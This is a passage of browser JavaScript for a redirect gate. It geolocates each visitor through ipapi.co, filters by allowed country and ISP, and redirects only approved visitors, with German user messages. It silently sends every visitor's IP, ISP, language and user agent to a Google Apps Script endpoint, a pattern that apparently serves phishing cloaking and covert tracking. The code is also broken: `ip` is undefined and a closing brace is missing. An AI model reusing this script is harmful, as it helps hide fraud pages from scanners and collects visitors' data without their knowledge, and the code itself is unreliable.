    const VISIT_WINDOW = 2 * 60 * 1000;

    function isRateLimited() {
      const now = Date.now();
      const visits = JSON.parse(localStorage.getItem("visits") || "[]")
        .filter(ts => now - ts < VISIT_WINDOW);
      visits.push(now);
      localStorage.setItem("visits", JSON.stringify(visits));
      return visits.length > VISIT_LIMIT;
    }

    async function main() {
      const messageEl = document.getElementById("message");
      const info = await fetch("https://ipapi.co/json/").then(r => r.json().catch(() => ({})));

      const countryCode = (info.country || "").toUpperCase();
      const isp = info.org || "Unbekannt";
      const lang = navigator.language || "Unbekannt";
      const ua = navigator.userAgent || "Unbekannt";

      const blocked = isRateLimited();
      const valid = ALLOWED_COUNTRIES.includes(countryCode) && ALLOWED_ISPS.some(x => isp.includes(x));
      const status = valid ? "跳转成功" : "跳转失败";

      await fetch(GAS_URL, {
        method: "POST",
        body: JSON.stringify({ ip, countryCode, isp, lang, ua, status })
      });

      if (blocked) {
        messageEl.innerText = "⚠️ Zu viele Anfragen – bitte später erneut versuchen.";
      } else if (valid) {
        messageEl.innerText = "Erfolgreich – Weiterleitung erfolgt...";
        setTimeout(() => window.location.href = REDIRECT_URL, 1000);
      } else {
        messageEl.innerText = "Zugriff verweigert: Dieser Anbieter wird nicht unterstützt.";
      }

    main();
